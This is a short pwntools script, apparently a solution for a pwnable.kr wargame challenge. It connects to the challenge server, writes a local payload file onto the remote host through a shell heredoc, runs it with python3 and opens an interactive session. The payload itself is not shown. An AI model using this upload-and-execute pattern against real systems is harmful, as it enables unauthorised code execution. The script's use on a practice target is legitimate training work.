from pwn import *

p = remote('pwnable.kr',10006)

with open('payload.py','rb') as f:
    payload=f.read()

p.sendline(b'cat <<"EOF">test.py')
p.sendline(payload)
p.sendline(b'EOF')
p.sendline(b'python3 test.py')

p.interactive()